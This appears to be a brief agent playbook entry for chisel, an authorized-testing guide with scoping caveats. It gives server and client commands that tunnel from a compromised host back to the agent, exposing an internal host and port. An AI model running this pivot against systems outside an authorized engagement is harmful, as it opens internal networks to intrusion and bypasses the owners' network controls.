# chisel

Use to establish an explicitly scoped reverse tunnel when the agent and internal
target are on different networks.

On the agent:

```bash
chisel server --reverse --host 127.0.0.1 --port RELAY_PORT
```

On a reachable compromised host:

```bash
chisel client AGENT_REACHABLE_ADDRESS:RELAY_PORT \
  R:127.0.0.1:LOCAL_PORT:INTERNAL_HOST:INTERNAL_PORT
```

Use the smallest tunnel that advances the task. Authenticate the server when
possible, stop it immediately after use, and never expose the tunnel beyond the
authorized environment.
